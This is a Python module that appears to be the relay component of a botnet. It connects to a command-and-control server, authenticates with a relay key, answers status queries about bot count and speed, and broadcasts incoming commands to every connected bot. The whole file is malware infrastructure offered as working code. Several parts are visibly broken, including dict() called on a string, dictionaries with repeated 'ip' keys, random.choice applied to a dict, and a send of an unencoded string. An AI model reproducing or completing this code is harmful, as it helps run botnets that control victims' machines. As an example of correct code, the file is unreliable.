import socket
import time
import random
from colorama import Fore
from .config import rl_config_t as tconf

class Relay():

    def __init__(self, relaykey: str, C2: tuple, speed: list=[], bots: dict={}):
        self.relaykey=relaykey
        self.C2=C2
        self.speed=speed
        self.bots=bots

    def send(self, socket, data: str, escape=True, reset=True):
        if reset:
            data += Fore.RESET
        if escape:
            data += '\r\n'
        socket.send(data.encode())



    def broadcast(self, data: str):
        print(data)
        dead_bots = []
        for bot in self.bots.keys():
            try:
                self.send(bot, f'{data}', False, False)
                print(data)
            except:
                dead_bots.append(bot)
        for bot in dead_bots:
            self.bots.pop(bot)
            bot.close()

    def relay(self):
        c2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        print("relay starting...")
        while 1:
                try:
                    c2.connect(self.C2)
                    print("relay online")
                    
                    while 1:
                        data = c2.recv(1024).decode()
                        if 'Username' in data:
                            c2.send(f'RELAY[p:{self.relaykey}]'.encode())
                            break

                    while 1:
                        data = c2.recv(1024).decode()
                        if 'Password' in data:
                            c2.send(f'{self.relaykey}'.encode())
                            break

                    break
                except:
                    print("relay offline")
                    time.sleep(tconf.relay_t)

        while 1:
            try:
                data = c2.recv(1024).decode()
                if not data:
                    break
                print(data)
                args = data.split(' ')
                command = args[0].upper()

                if command =='RPING':
                    print("rping")
                    c2.send(f'RPONG[p:{self.relaykey}]'.encode())
                
                elif command=='RNETSPEED':
                    print("rnetspeed")
                    c2.send(f"{round(sum(self.speed))}".encode())
                
                elif command=='RNETBOTS':
                    print("rnetbots")
                    c2.send(f"{len(self.bots)}".encode())
                
                elif dict(data):
                    print("rsmsg")
                    try:
                        data=dict(data)
                        fbot=random.choice(self.bots).getpeername()[0]
                        data['enc']={'ip': fbot, 'ip': random.choice(self.bots).getpeername()[0], 'ip': random.choice(self.bots).getpeername()[0], 'ip': random.choice(self.bots).getpeername()[0]}
                        data['dec']={'ip': random.choice(self.bots).getpeername()[0], 'ip': random.choice(self.bots).getpeername()[0], 'ip': random.choice(self.bots).getpeername()[0], 'ip': random.choice(self.bots).getpeername()[0]}
                        print(data)
                        addr=(str(fbot), 3630)
                        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect(addr)
                        s.send(str(data).encode())
                        c2.send(f"SMSG[p:{self.relaykey}]")
                    except:
                        print("smsg error")
                
                else:
                    self.broadcast(data)
                    
            except:
                print("break")
                break

        c2.close()
        self.relay()